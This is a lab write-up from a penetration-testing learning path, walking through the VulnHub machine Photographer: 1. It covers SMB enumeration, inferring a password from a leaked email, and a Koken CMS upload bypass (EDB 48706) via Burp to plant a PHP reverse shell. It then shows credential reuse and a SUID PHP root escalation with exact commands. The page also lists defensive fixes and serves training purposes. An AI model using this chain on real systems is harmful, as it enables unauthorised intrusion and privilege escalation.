# Machine 11 — Photographer: 1

> **Position:** 11 of 13 · **Band 3 — Easy** (global rank **055** of 708)
> **Full writeup:** [`labs/3-055-photographer-1/README.md`](../../labs/3-055-photographer-1/README.md)

| | |
| --- | --- |
| **Machine** | Photographer: 1 |
| **Author** | Vinícius Vieira ("v1n1v131r4") |
| **Released** | 21 July 2020 |
| **Target** | Ubuntu 16.04 (EOL) — Apache 2.4.18, Samba 4.3.11, **Koken CMS 0.22.24**, PHP 7.2 |
| **VulnHub** | [entry/photographer-1,519](https://vulnhub.com/entry/photographer-1,519/) |
| **Flags** | 2 — `/home/daisa/user.txt`, `/root/proof.txt` |
| **Estimated time** | 4–6 hours |

---

## Why this machine is here

Because it starts **away from the web server entirely**. The foothold is not a
vulnerability in code — it is an **anonymous SMB share containing real company
correspondence**, and the credential you need is not in any wordlist. It is *implied
by an email*:

> *"Don't forget your secret, my babygirl ;)"*

That teaches a skill no other box in this path does: **reading leaked documents for
what they imply, not just what they state.** Real breach investigations are full of
this — an attachment, a ticket, a forwarded email, and a password that nobody would
ever have guessed from a list.

It then gives you a **CMS upload bypass with a public Exploit-DB entry** (Koken
0.22.24, EDB **48706**) that requires **Burp Suite interception** to mutate the
request mid-flight, and finishes with SUID on a **PHP interpreter** — a binary you
would not think to check.

## Learning objectives

1. Enumerate SMB properly and interpret **`READ ONLY`** vs **`NO ACCESS`** in
   `smbmap` output.
2. Download and analyse files from an **anonymous share** — and know what to look for.
3. **Infer a credential** from an informal email rather than cracking one.
4. **Fingerprint a CMS from an HTTP response header** (`http-generator: Koken 0.22.24`).
5. Understand **client-side-only upload validation** and why it is not a control.
6. Use **Burp Suite** to intercept and modify a request in flight.
7. **Locate an uploaded file** by reading the application's own UI and its storage
   conventions.
8. Escalate via **SUID PHP**, and understand the critical **`-p`** flag.
9. Read `id` output to distinguish **real UID** from **effective UID**.

## Attack classes covered

| Class | Where on this box |
| --- | --- |
| **Anonymous SMB share with real correspondence** | `sambashare` on :445 → `mailsent.txt`, `wordpress.bkp.zip` (12 MB) |
| SMB signing disabled | Samba 4.3.11 → relay exposure |
| **Credential inference from a leaked email** | *"my babygirl"* → password **`babygirl`** |
| Admin panel exposed to the network | `:8000/admin/` |
| **CMS arbitrary file upload** | Koken **0.22.24**, Exploit-DB **48706** — client-side extension check only |
| Request tampering | **Burp Suite** interception to strip `.jpg` from `shell.php.jpg` |
| Uploads inside the document root | `/storage/originals/…/shell.php` → executes on request |
| Verbose disclosure headers | `http-generator`, `X-Powered-By` → exact CMS and PHP versions |
| **Credential reuse: CMS password = system password** | `daisa` / `babygirl` → user flag |
| **SUID on a PHP interpreter** | `/usr/bin/php7.2` mode **`4755`** → `euid=0` |
| No sandboxing | Apache/PHP with no enforced AppArmor profile |
| EOL operating system | Ubuntu 16.04 |

## Read first

- [03 — Service and Network Attacks](../03-Service-and-Network-Attacks.md) **§2** —
  SMB enumeration, and the "what to hunt for inside shares" list.
- [02 — Web Attacks](../02-Web-Attacks.md) **§6** (file upload → web shell, including
  the bypass table) and §7 (CMS notes).
- [04 — Credentials and Cracking](../04-Credentials-and-Cracking.md) **§5** —
  credential reuse, and the "where credentials hide" table.
- [05 — Linux Privilege Escalation](../05-Linux-Privilege-Escalation.md) **§2** (SUID).

## Before you start — answer these

1. What does `smbmap` mean by `READ ONLY` on a share, and is that enough for an
   attacker?
2. An email says *"Don't forget your secret, my babygirl ;)"*. What is your password
   candidate list, and in what order?
3. A CMS advertises itself in an HTTP response header. Why is that a finding, and what
   do you do with the information?
4. What is **client-side** validation, and why can an attacker ignore it completely?
5. What does the `-p` flag do when you spawn a shell from a SUID binary?

## Hints ladder

<details>
<summary><strong>Rung 1 — a nudge</strong></summary>

Scan all ports:

```bash
sudo nmap -sC -sV -p- -T4 -oN scans/photographer.txt TARGET
```

You should see **80**, **139**, **445** and **8000**. Two things to do immediately:

1. Read the **response headers** on port 8000 — one of them names a CMS *and its exact
   version*.
2. Try **anonymous** access to the SMB shares. No credentials.
</details>

<details>
<summary><strong>Rung 2 — the share</strong></summary>

```bash
smbmap -H TARGET
smbclient //TARGET/sambashare -N
smb: \> ls
smb: \> get mailsent.txt
smb: \> get wordpress.bkp.zip
```

Two files: **`mailsent.txt`** (503 bytes) and **`wordpress.bkp.zip`** (~12 MB).

Read the email closely:

```text
To: Daisa Ahomi <daisa@photographer.com>
...
Your site is ready now.
Don't forget your secret, my babygirl ;)
```

Three things fall out of that: the **login identifier** is an *email address* (Koken
admins log in with an email, not a username); Daisa **owns** the site on port 8000;
and the password hint is the emphasised word — **`babygirl`**.

Candidates, in order: `babygirl`, `babygirl;`, `Babygirl`, `babygirl2020`, `daisa`,
`daisaahomi`, `secret`.

Also inspect the backup: `unzip -l wordpress.bkp.zip | head`, and
`unzip -p wordpress.bkp.zip wordpress/wp-config.php | grep -i password`.
</details>

<details>
<summary><strong>Rung 3 — the CMS and the upload</strong></summary>

`curl -sI http://TARGET:8000/` returns **`http-generator: Koken 0.22.24`**. The
admin panel is at **`http://TARGET:8000/admin/`**. Log in with
**`daisa@photographer.com : babygirl`**.

Now the upload. `searchsploit koken` → **EDB 48706**, *Koken CMS 0.22.24 — Arbitrary
File Upload (Authenticated)*. The extension check happens **in the browser's
JavaScript**, so a proxy that edits the request after the browser sends it defeats it
completely:

1. Set your browser's proxy to **Burp Suite** (`127.0.0.1:8080`), turn **Intercept
   on**.
2. In Koken, use **Import Content** to upload a file named **`shell.php.jpg`**
   containing a PHP reverse shell.
3. Burp stops the request. **Delete the `.jpg`** so the filename is `shell.php`.
4. Forward it.

Then find where it landed — read the UI's own link, or use the storage convention
`storage/originals/`.
</details>

<details>
<summary><strong>Rung 4 — shell, user flag, root</strong></summary>

Start `nc -lvnp 4444` **first**, then request the uploaded file. You land as
**`www-data`** (uid=33). Upgrade the TTY.

`/home/daisa/user.txt` is `-rw-------` owned by `daisa`, so `www-data` cannot read it.
But the **CMS password is reused as the system password**:

```bash
su daisa          # babygirl
cat /home/daisa/user.txt
```

Root:

```bash
find / -perm -4000 -type f 2>/dev/null
# /usr/bin/php7.2   <- an interpreter, SUID root, mode 4755
/usr/bin/php7.2 -r "pcntl_exec('/bin/sh', ['-p']);"
id      # euid=0(root)
cat /root/proof.txt
```

**`-p` is essential** — without it the shell drops the SUID privileges and you stay
`daisa`.
</details>

<details>
<summary><strong>Rung 5 — the answer</strong></summary>

1. `nmap -p-` → **80**, **139**, **445**, **8000** (Apache 2.4.18, title
   `daisa ahomi`).
2. `smbmap -H TARGET` → anonymous share **`sambashare`** (`READ ONLY`); SMB signing
   **disabled**.
3. `smbclient //TARGET/sambashare -N` → **`mailsent.txt`** and
   **`wordpress.bkp.zip`**.
4. The email is from **agi** to **daisa@photographer.com** and ends *"Don't forget
   your secret, my babygirl ;)"* → password **`babygirl`**.
5. Port **8000** header `http-generator: Koken 0.22.24`; admin at `/admin/`; log in
   as `daisa@photographer.com : babygirl`.
6. **EDB 48706**: upload `shell.php.jpg`, **intercept in Burp, strip `.jpg`** →
   lands in `/storage/originals/…/shell.php`.
7. Trigger it → **`www-data`** → TTY upgrade.
8. **Credential reuse:** `su daisa` with `babygirl` → **`/home/daisa/user.txt`**.
9. `find / -perm -4000` → **`/usr/bin/php7.2` mode `4755`** →
   `php7.2 -r "pcntl_exec('/bin/sh', ['-p']);"` → **euid=0** → **`/root/proof.txt`**.
</details>

## After you finish — review questions

1. How did you get the password without cracking anything? Why is that *more*
   worrying for the defender than a weak password?
2. `smbmap` said `READ ONLY`. Why was read access alone enough to compromise the
   entire machine?
3. The extension check was in JavaScript. What exactly does that mean about who
   enforces it, and what is the minimum server-side change that would fix it?
4. Why did you need Burp rather than `curl` here? Could you have done it with `curl`?
   Write the command.
5. How did you find the uploaded file's path? Name two independent methods.
6. Why did `pcntl_exec('/bin/sh', ['-p'])` work when `/bin/sh` alone would not?
7. The CMS password equalled the system password. What single policy stops that?
8. Ubuntu 16.04 is EOL. Combined with the missing AppArmor profile, what is the
   compounding effect?

## Defensive reflection

| Finding | Fix |
| --- | --- |
| **Anonymous SMB share with correspondence** | Disable anonymous/guest access; require authentication on every share; audit shares quarterly |
| SMB signing disabled | `server signing = mandatory` in `smb.conf`; blocks relay attacks |
| Email leaked with a password hint | Data-loss prevention on file shares; user awareness training; never write credential hints in shared documents |
| **`babygirl` as a password** | Enforce length + a breached-password check; require MFA on the CMS admin |
| Admin panel reachable from the network | Bind `:8000/admin/` to localhost or a management VLAN; require VPN |
| **Client-side-only upload validation (EDB 48706)** | Validate server-side: extension **allow-list**, MIME **and** content check, and **re-encode** images (which strips appended PHP). Upgrade the CMS |
| Uploads stored in the document root with the attacker's extension | Store outside the web root; serve with `Content-Disposition: attachment`; disable the PHP engine for that directory |
| `http-generator` / `X-Powered-By` disclose versions | Suppress them — but note that suppression only slows an attacker; the real fix is upgrading |
| **CMS password = system password** | Unique credentials per service; a secrets manager; alert on credential overlap |
| **SUID root on `/usr/bin/php7.2`** | `chmod u-s`. An SUID interpreter is root for anyone who can run it. Audit SUID against the stock set |
| No AppArmor profile for Apache/PHP | Enforce a confinement profile so a compromised `www-data` cannot read broadly |
| Ubuntu 16.04 (EOL) | Upgrade. This is the root cause behind several findings |

**The single biggest lesson:** *people write down their secrets.* The vulnerability
here was not in Koken, not in Samba and not in PHP — it was an email on an open file
share. Technical controls matter, but so does the human layer, and it is usually
weaker.

---

_Back to [Learning Path 1](../README.md) · previous: [Machine 10 — PwnLab: init](10-pwnlab-init.md) · next: [Machine 12 — symfonos: 1](12-symfonos-1.md) · full writeup: [`labs/3-055-photographer-1`](../../labs/3-055-photographer-1/README.md)._
